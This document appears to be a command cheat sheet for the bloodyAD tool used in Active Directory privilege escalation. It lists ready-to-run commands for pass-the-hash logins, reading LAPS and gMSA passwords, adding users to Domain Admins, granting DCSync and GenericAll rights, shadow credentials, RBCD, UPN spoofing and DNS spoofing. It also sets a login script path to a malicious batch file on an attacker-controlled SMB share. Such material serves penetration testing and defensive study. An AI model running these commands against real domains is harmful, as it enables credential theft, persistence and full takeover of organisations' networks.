**Overview:**
This tool can perform specific LDAP calls to a domain controller in order to perform AD privesc.

`bloodyAD` supports authentication using cleartext passwords, pass-the-hash, pass-the-ticket or certificates and binds to LDAP services of a domain controller to perform AD privesc.

Exchange of sensitive information without LDAPS is supported.

It is also designed to be used transparently with a SOCKS proxy.

---
### Authentication Methods

bloodyAD supports multiple authentication mechanisms for different scenarios.

#### Username and Password Authentication

Standard authentication using cleartext credentials:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' [command]
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'john.doe' -p 'Password123!' get object administrator
```

#### Pass-the-Hash (PtH)

Authenticate using NTLM hash (prefix with colon):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p ':<NTLM_hash>' [command]
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p ':e656e07c56d831611b577b160b259ad2' get object administrator
```

#### Kerberos Authentication

Use Kerberos tickets (requires FQDN):

```bash
bloodyAD --host <DC_FQDN> -d <domain> -k [command]
```

**Example:**

```bash
bloodyAD --host DC01.lab.local -d lab.local -k get object administrator
```

#### Authentication Format Options

Specify hash format explicitly:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' -f rc4 [command]
```

---
### Domain Enumeration

#### User Enumeration

**Retrieve Complete User Information**

Get all available attributes for a specific user:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<target_user>'
```

**Retrieve Critical User Attributes**

Get essential user information (useful for quick assessment):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<target_user>' --attr name,distinguishedName,objectSid,description,memberOf,userAccountControl,adminCount
```

**List All Domain Users**

Enumerate all users (returns distinguishedName only):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children --otype user
```

Alternative syntax:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children 'DC=<domain>,DC=<tld>' --type user
```

**Check UserAccountControl Flags**

Retrieve UAC flags for a specific user:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<target_user>' --attr userAccountControl
```

**Verify UPN Modification**

Check if userPrincipalName has been modified:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<target_user>' --attr userPrincipalName
```

#### Group Enumeration

**Get Group Membership**

Retrieve group membership for any object (user/group/computer):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<target_object>' --attr memberOf
```

**List Group Members**

Get all members of a specific group:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get membership '<target_group>'
```

Alternative method:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<group_name>' --attr member
```

**List All Domain Groups**

Enumerate all groups (returns distinguishedName only):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children --otype group
```

Alternative syntax:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children 'DC=<domain>,DC=<tld>' --type group
```

#### Computer Enumeration

**List All Domain Computers**

Enumerate all computer accounts:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children --otype computer
```

Alternative syntax:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children 'DC=<domain>,DC=<tld>' --type computer
```

#### Organizational Units (OUs)

**List All OUs**

Enumerate organizational units and containers:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children --otype container
```

Alternative syntax:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children 'DC=<domain>,DC=<tld>' --type container
```

#### Trust Relationships

**List All Domain Trusts**

Enumerate trust relationships:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get children --otype trustedDomain
```

#### Domain Policy Enumeration

**Get Minimum Password Length**

Retrieve domain password policy:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object 'DC=<domain>,DC=<tld>' --attr minPwdLength
```

**Get AD Functional Level**

Check Active Directory forest/domain functional level:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object 'DC=<domain>,DC=<tld>' --attr msDS-Behavior-Version
```

**Get Machine Account Quota**

Check available machine account quota:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object 'DC=<domain>,DC=<tld>' --attr ms-DS-MachineAccountQuota
```

**Set Machine Account Quota**

Modify machine account quota (requires appropriate permissions):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object 'DC=<domain>,DC=<tld>' ms-DS-MachineAccountQuota -v 10
```

***

### ACL and Permission Enumeration

#### Find Writable Attributes

Enumerate objects where you have write access (discovers permissions not shown in BloodHound):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get writable --detail
```

#### Get Object Security Descriptor

Manually enumerate complete DACL list for an object:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<target_object>' --attr ntsecuritydescriptor --resolve-sd
```

#### Find Deleted Objects with Permissions

Search for deleted objects where you still have permissions:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get writable --include-del
```

***

### Kerberos Attack Enumeration

#### Find Kerberoastable Users

Identify users with SPN (servicePrincipalName) assigned:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName
```

Extract only usernames:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName | grep sAMAccountName | cut -d ' ' -f 2
```

#### Find AS-REP Roastable Users

Identify users with DONT\_REQ\_PREAUTH flag:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

***

### Password Operations

#### Change User Password

Modify a user's password (requires appropriate permissions):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set password '<target_user>' '<new_password>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' set password 'john.doe' 'NewPass123!'
```

#### Read gMSA Password

Retrieve Group Managed Service Account password:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<gMSA_account>$' --attr msDS-ManagedPassword
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' get object 'svc_gmsa$' --attr msDS-ManagedPassword
```

#### Read LAPS Password

Retrieve Local Administrator Password Solution (LAPS) passwords:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```

Alternative method for specific computer:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object '<COMPUTER>$' --attr ms-Mcs-AdmPwd
```

***

### Group Membership Management

#### Add User to Group

Add a member to a group:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add groupMember '<group_name>' '<member_to_add>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' add groupMember 'Domain Admins' 'john.doe'
```

#### Remove User from Group

Remove a member from a group:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' delete groupMember '<group_name>' '<member_to_remove>'
```

***

### ACL Exploitation

#### Grant GenericAll Permissions

Add full control (GenericAll) to an object:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add genericAll '<target_DN>' '<target_user>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' add genericAll 'CN=Administrator,CN=Users,DC=lab,DC=local' 'john.doe'
```

#### Modify Object Owner (WriteOwner)

Take ownership of an object:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set owner '<target_object>' '<new_owner>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'john.doe' -p 'Password123!' set owner 'Domain Admins' 'john.doe'
```

#### Add DCSync Permissions

Grant DCSync rights to a user (requires elevated privileges):

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add dcsync '<target_object>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' add dcsync 'john.doe'
```

***

### User Account Control (UAC) Manipulation

#### Enable DONT\_REQ\_PREAUTH (AS-REP Roasting)

Make a user AS-REP Roastable:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add uac '<target_user>' -f DONT_REQ_PREAUTH
```

**Requirements:** GenericAll or GenericWrite permissions on target user

#### Disable ACCOUNTDISABLE (Enable Disabled Account)

Enable a disabled user account:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' remove uac '<target_user>' -f ACCOUNTDISABLE
```

#### Add TRUSTED\_TO\_AUTH\_FOR\_DELEGATION

Enable unconstrained delegation:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add uac '<target>' -f TRUSTED_TO_AUTH_FOR_DELEGATION
```

***

### Kerberos Attacks

#### Shadow Credentials Attack

Add shadow credentials for PKINIT authentication:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add shadowCredentials '<target>'
```

**Note:** Requires PKINIT authentication afterward to obtain TGT

#### Kerberoasting (Assign SPN)

Make a user Kerberoastable by assigning servicePrincipalName:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object '<target>' servicePrincipalName -v 'cifs/service'
```

**Requirements:** GenericAll or GenericWrite permissions on target user

#### Remove Assigned SPN

Remove previously assigned servicePrincipalName:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' remove object '<target>' servicePrincipalName
```

#### Resource-Based Constrained Delegation (RBCD)

Configure RBCD to allow impersonation:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add rbcd '<DELEGATE_TO>$' '<DELEGATE_FROM>$'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' add rbcd 'DC01$' 'ATTACK01$'
```

**Use Case:** After configuration, the DELEGATE\_FROM account can impersonate users on DELEGATE\_TO via S4U2Proxy

***

### Computer Account Operations

#### Create New Computer Account

Add a computer account to the domain:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add computer '<computer_name>' '<computer_password>'
```

**Note:** Requires available machine account quota (default: 10 per user)

#### BadSuccessor Attack (dMSA - Windows Server 2025)

Exploit CREATE\_CHILD permission on OU:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add badSuccessor '<attacker_dMSA>'
```

***

### Attribute Modification

#### Modify UserPrincipalName (UPN Spoofing)

Change UPN for ADCS/certificate attacks:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object '<target_user>' userPrincipalName -v '<new_upn>@<domain>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'john.doe' -p 'Password123!' set object 'lowpriv' userPrincipalName -v 'administrator@lab.local'
```

#### Modify Mail Attribute

Change user's email address:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object '<target_user>' mail -v '<new_email>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' set object 'john.doe' mail -v 'attacker@evil.com'
```

#### Modify altSecurityIdentities (ESC14/ESC14B)

Set altSecurityIdentities for X.509 certificate attacks:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object '<target_user>' altSecurityIdentities -v 'X509:<RFC822><email>@<domain>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'john.doe' -p 'Password123!' set object 'target' altSecurityIdentities -v 'X509:<RFC822>admin@lab.local'
```

#### Add Malicious Login Script

Set scriptPath to execute malicious script on user login:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object '<target>' scriptpath -v '\\<ATTACKER_IP>\<malicious_script>.bat'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' set object 'victim' scriptpath -v '\\10.10.14.50\share\evil.bat'
```

***

### DNS Operations

#### Dump DNS Records

Export all DNS records from Active Directory:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get dnsDump > dns_records.txt
```

#### Add DNS Record (DNS Spoofing)

Create a new DNS record for spoofing attacks:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' add dnsRecord '<record_name>' '<attacker_ip>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'john.doe' -p 'Password123!' add dnsRecord 'fileserver' '10.10.14.50'
```

**Note:** Check permissions first with `get writable --detail`

#### Remove DNS Record

Delete an existing DNS record:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' remove dnsRecord '<record_name>' '<ip_address>'
```

***

### Advanced Search Operations

#### Custom LDAP Search

Perform advanced LDAP queries:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search --filter '<LDAP_filter>' --attr <attributes>
```

#### Extended Search Controls

Use OID controls for special search operations:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search -c <OID_control> --filter '<filter>' --attr <attributes>
```

**Example - Display tombstoned (deleted) objects:**

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' -k get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)' --attr name,objectSid,objectGuid
```

#### Search Help

View available search options:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search -h
```

***

### Deleted Object Recovery

#### Check Restore Permissions

Verify if you have permissions to restore deleted objects:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get object 'DC=<domain>,DC=<tld>' --attr ntsecuritydescriptor --resolve-sd | grep -B3 'Reanimate-Tombstones'
```

Alternative method:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get writable --detail
```

#### Find Deleted Users

Search for deleted users in Active Directory recycle bin:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --filter '(isDeleted=TRUE)' --attr name,objectSid,objectGuid
```

#### Restore Deleted Object

Restore a deleted user or object:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' -k set restore '<identifier>'
```

**Supported identifiers:** GUID, SID, Distinguished Name, or sAMAccountName

**Example:**

```bash
bloodyAD --host DC01.lab.local -d lab.local -k set restore 'S-1-5-21-3927696377-1337352550-2781715495-1110'
```

***

### GPO Operations

#### Link GPO to Object

Associate a Group Policy Object with a target:

```bash
bloodyAD --host <DC_IP> -d <domain> -u '<username>' -p '<password>' set object '<target>$' GPLink -v 'CN={<GPO_GUID>},CN=POLICIES,CN=SYSTEM,DC=<domain>,DC=<tld>'
```

**Example:**

```bash
bloodyAD --host 10.10.10.10 -d lab.local -u 'admin' -p 'Password123!' set object 'SRV01$' GPLink -v 'CN={2AADC2C9-C75F-45EF-A002-A22E1893FDB5},CN=POLICIES,CN=SYSTEM,DC=lab,DC=local'
```

